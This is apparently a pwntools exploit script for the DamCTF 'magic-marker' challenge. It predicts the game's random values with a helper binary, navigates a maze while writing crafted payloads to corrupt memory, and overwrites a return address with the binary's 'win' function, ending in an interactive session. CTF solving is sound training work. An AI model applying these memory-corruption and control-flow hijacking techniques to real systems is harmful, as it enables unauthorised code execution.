#!/usr/bin/env python3



from pwn import *
import time

e = ELF("./magic-marker")
r1 = remote("chals.damctf.xyz",31313)
#r1 = process("./magic-marker")
r2 = process("./timer")
values = r2.recv()
values = values.split(b"\n")
rand1,rand2 = int(values[0]),int(values[1])
log.info("The random values after mod are " + str(rand1) + " " + str(rand2) )
r2.close()
r1.recvuntil(b"What would you like to do?")
r1.sendline(b"jump up and down")
r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
r1.sendline(b"x")
payload = p64(0) * 3 + p32(0) + p32(0x6)
r1.recvuntil(b"you like to write?")
r1.sendline(payload)
while(rand1 < 0x27):
    print("loop 1")
    r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
    r1.sendline(b"s")
    r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
    r1.sendline(b"x")
    r1.recvuntil(b"you like to write?")
    r1.sendline(payload)
    rand1+=1
while(rand2 < 0x27 ):
    print("loop 2")
    r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
    r1.sendline(b"d")
    r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
    if(rand2 == 0x26):
        r1.sendline(b"x")
        r1.recvuntil(b"you like to write?")
        r1.sendline(payload)
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"d")
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"d")
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"d")
        r1.sendline(b"x")
        r1.recvuntil(b"you like to write?")
        r1.sendline(payload)
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"d")
        r1.sendline(b"x")
        r1.recvuntil(b"you like to write?")
        r1.sendline(b"A" * 8 + p64(e.sym["win"]))
        r1.recvuntil(b"What would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up):")
        r1.sendline(b"q")
        print("End of the rail")
        print(r1.recv())
        print(r1.recv())
    else:
        r1.sendline(b"x")
        r1.recvuntil(b"you like to write?")
        r1.sendline(payload)
    rand2+=1
print(rand1)
print(rand2)
r1.interactive()
